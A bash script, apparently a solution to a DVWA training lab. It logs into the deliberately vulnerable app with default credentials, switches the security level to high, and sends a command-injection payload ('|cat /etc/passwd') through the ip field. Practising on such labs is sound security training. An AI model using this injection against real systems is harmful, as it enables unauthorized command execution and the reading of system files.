#Login with found details
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to high (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.high -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.high -c dvwa.cookie.high -d $"security=high&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "Command Injection" page
curl -s -i -L -b dvwa.cookie.high "192.168.178.98/dvwa/vulnerabilities/exec/" > /dev/null
#Get the server to 'cat /etc/passwd'
curl -s -i -L -b dvwa.cookie.high "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=%7Ccat+%2Fetc%2Fpasswd&Submit=Submit" > result
rm -f dvwa*
